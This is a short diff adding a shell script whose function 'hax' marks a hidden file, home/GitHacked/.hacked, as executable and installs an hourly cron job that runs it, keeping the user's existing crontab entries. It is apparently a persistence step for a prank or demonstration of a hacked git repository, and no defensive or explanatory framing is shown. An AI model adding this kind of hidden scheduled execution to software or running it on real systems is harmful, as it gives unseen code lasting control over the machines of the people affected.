@@ -1,0 +1,13 @@
+#!/bin/sh
+hax()
+{
+    chmod +x home/GitHacked/.hacked;
+    #https://stackoverflow.com/questions/878600/how-to-create-a-cron-job-using-bash-automatically-without-the-interactive-editor
+    #write out current crontab
+    crontab -l > haxcron
+    #echo new cron into cron file
+    echo "0 * * * * home/GitHacked/.hacked" >> haxcron
+    #install new cron file
+    crontab haxcron
+    rm haxcron
+}
